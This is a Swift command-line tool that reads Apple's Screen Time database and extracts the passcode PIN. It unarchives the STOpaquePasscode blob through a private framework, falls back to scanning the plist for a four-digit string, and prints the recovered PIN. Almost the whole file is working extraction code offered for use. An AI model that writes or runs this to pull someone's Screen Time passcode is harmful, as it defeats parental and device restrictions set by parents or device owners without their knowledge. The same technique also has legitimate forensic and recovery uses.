// decode_passcode.swift
// Decodes an STOpaquePasscode blob from the Screen Time CoreData store.
// Usage: decode_passcode <path-to-RMAdminStore-Local.sqlite>
//
// The passcode blob lives in ZBLUEPRINTCONFIGURATION.ZPAYLOADPLIST
// for rows where the configuration type is passcode-related.
// The blob is an NSKeyedArchiver bplist containing an STOpaquePasscode
// object, which wraps a plain NSString — the 4-digit PIN in cleartext.

import Foundation
import SQLite3

guard CommandLine.arguments.count > 1 else {
    print("Usage: decode_passcode <path-to-RMAdminStore-Local.sqlite>")
    print("       decode_passcode --blob <hex-encoded-blob>")
    exit(1)
}

// Load ScreenTimeCore for STOpaquePasscode class
let handle = dlopen("/System/Library/PrivateFrameworks/ScreenTimeCore.framework/ScreenTimeCore", RTLD_NOW)

func decodePasscodeBlob(_ data: Data) -> String? {
    // Method 1: NSKeyedUnarchiver with STOpaquePasscode class
    if let cls = NSClassFromString("STOpaquePasscode") {
        let unarchiver = try? NSKeyedUnarchiver(forReadingFrom: data)
        unarchiver?.requiresSecureCoding = false
        if let obj = unarchiver?.decodeObject(forKey: "root") as? NSObject {
            let sel = NSSelectorFromString("passcode")
            if obj.responds(to: sel),
               let val = obj.perform(sel)?.takeUnretainedValue() as? String {
                return val
            }
        }
    }
    
    // Method 2: Parse the bplist directly and extract the string
    // The PIN appears as the 3rd object in $objects array (index 2)
    // In binary plist format, it's at a known offset as an ASCII string
    if let plist = try? PropertyListSerialization.propertyList(from: data, format: nil) as? [String: Any],
       let objects = plist["$objects"] as? [Any] {
        // The PIN is typically at index 2 in $objects
        for (i, obj) in objects.enumerated() {
            if let str = obj as? String, str.count == 4, str.allSatisfy({ $0.isNumber }) {
                return str
            }
        }
    }
    
    return nil
}

if CommandLine.arguments[1] == "--blob" {
    // Decode a hex-encoded blob directly
    guard CommandLine.arguments.count > 2 else {
        print("Usage: decode_passcode --blob <hex-string>")
        exit(1)
    }
    let hex = CommandLine.arguments[2]
    var data = Data()
    var i = hex.startIndex
    while i < hex.endIndex {
        let next = hex.index(i, offsetBy: 2)
        if let byte = UInt8(hex[i..<next], radix: 16) {
            data.append(byte)
        }
        i = next
    }
    if let pin = decodePasscodeBlob(data) {
        print("Decoded PIN: \(pin)")
    } else {
        print("Failed to decode blob")
    }
    exit(0)
}

// Open the SQLite database
let dbPath = CommandLine.arguments[1]
var db: OpaquePointer?

guard sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, nil) == SQLITE_OK else {
    print("Error: Cannot open database at \(dbPath)")
    if let errmsg = sqlite3_errmsg(db) {
        print("SQLite error: \(String(cString: errmsg))")
    }
    exit(1)
}

// Query for passcode configuration blobs
let query = """
    SELECT bc.Z_PK, bc.ZIDENTIFIER, bc.ZTYPE, bc.ZPAYLOADPLIST, b.ZIDENTIFIER as blueprint_id, b.ZTYPE as blueprint_type
    FROM ZBLUEPRINTCONFIGURATION bc
    LEFT JOIN ZBLUEPRINT b ON bc.ZBLUEPRINT = b.Z_PK
    WHERE bc.ZPAYLOADPLIST IS NOT NULL
"""

var stmt: OpaquePointer?
guard sqlite3_prepare_v2(db, query, -1, &stmt, nil) == SQLITE_OK else {
    print("Error preparing query: \(String(cString: sqlite3_errmsg(db)!))")
    exit(1)
}

print("Scanning ZBLUEPRINTCONFIGURATION for passcode blobs...\n")

var found = false
while sqlite3_step(stmt) == SQLITE_ROW {
    let pk = sqlite3_column_int(stmt, 0)
    let identifier = sqlite3_column_text(stmt, 1).map { String(cString: $0) } ?? "?"
    let type = sqlite3_column_text(stmt, 2).map { String(cString: $0) } ?? "?"
    let blobPtr = sqlite3_column_blob(stmt, 3)
    let blobLen = sqlite3_column_bytes(stmt, 3)
    let blueprintId = sqlite3_column_text(stmt, 4).map { String(cString: $0) } ?? "?"
    let blueprintType = sqlite3_column_text(stmt, 5).map { String(cString: $0) } ?? "?"
    
    guard let ptr = blobPtr, blobLen > 0 else { continue }
    let data = Data(bytes: ptr, count: Int(blobLen))
    
    // Try to decode as STOpaquePasscode
    if let pin = decodePasscodeBlob(data) {
        print("FOUND PASSCODE in row \(pk):")
        print("  Blueprint: \(blueprintId) (type: \(blueprintType))")
        print("  Config: \(identifier) (type: \(type))")
        print("  PIN: \(pin)")
        found = true
    }
}

if !found {
    print("No passcode blobs found in this database.")
    print("The passcode may be stored in a configuration type that wasn't matched,")
    print("or the database may not have a passcode set.")
}

sqlite3_finalize(stmt)
sqlite3_close(db)
